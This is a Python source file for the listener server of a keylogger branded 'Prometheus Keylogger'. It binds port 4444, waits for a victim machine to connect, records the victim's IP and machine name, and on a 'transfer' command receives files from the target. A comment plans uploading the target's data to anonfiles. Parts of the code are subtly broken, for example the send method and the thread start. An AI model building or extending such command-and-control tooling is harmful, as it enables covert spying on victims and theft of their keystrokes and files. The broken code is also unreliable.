import socket
import threading
import time

import requests
from pystyle import *


class OnlineKeylogger:
    def __init__(self):
        self.port = 4444  # config["port"]
        self.ip = requests.get("https://checkip.amazonaws.com").text.strip()
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.socket = socket.socket()

    def send(self, args, encode):
        return self.socket.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        if encode is not None:
            receive = self.client.recv(size).decode(encode)
        else:
            receive = self.client.recv(size)

        return receive

    def connection_handle(self):
        logo = """                                                                                                                 
                  _____                          _   _                           _  ___      
                 |  __ \                        | | | |                         | |/ / |     
                 | |__) | __ ___  _ __ ___   ___| |_| |__   ___ _   _ ___       | ' /| |     
                 |  ___/ '__/ _ \| '_ ` _ \ / _ \ __| '_ \ / _ \ | | / __|      |  < | |     
                 | |   | | | (_) | | | | | |  __/ |_| | | |  __/ |_| \__ \      | . \| |____ 
                 |_|   |_|  \___/|_| |_| |_|\___|\__|_| |_|\___|\__,_|___/      |_|\_\______|                                                                   
                   """

        print(Colorate.Horizontal(Colors.blue_to_purple, logo, 3))
        print(Colors.white)
        print(Colors.white + "[" + Colors.blue + "Prometheus Keylogger" + Colors.white + "] " + Colors.purple + "Server started at " + self.ip + " Port: " + str(self.port))

        self.socket.bind(("", self.port))
        self.socket.listen(1)
        (self.client, self.address) = self.socket.accept()
        client_ip = self.client.recv(self._DEFAULT_SIZE).decode(self._ENCODING_FORMAT)
        client_machine = self.client.recv(self._DEFAULT_SIZE).decode(self._ENCODING_FORMAT)

        print(
            Colors.white + "[" + Colors.blue + "Prometheus Keylogger" + Colors.white + "] " + Colors.green +
            "Connection accepted by " + Colors.white + "[" + client_ip + "]" + Colors.green +
            " Machine name: " + Colors.white + "[" + client_machine + "]" + Colors.white
        )

        while True:
            input_command = input(
                Colors.white + "[" + Colors.blue + "Prometheus Keylogger" + Colors.white + "]" + " > ")
            if input_command == "transfer":
                self.send(bytes(input_command), self._ENCODING_FORMAT)
                filename = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
                filesize = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
                filedata = self.client.recv(int(filesize))
                with open(filename, "wb") as file:
                    file.write(filedata)


            if input_command == "upload file":
                pass
                # to add an anonfile upload function and receive the link from the target


if __name__ == "__main__":
    try:
        kl = OnlineKeylogger()
        threading.Thread(target=kl.connection_handle()).start()
    except OSError:
        print(Colors.red + "[ERROR]" + Colors.white + "Listener server already running. Close any other running server to continue.\nAborting..\n")
        time.sleep(5)
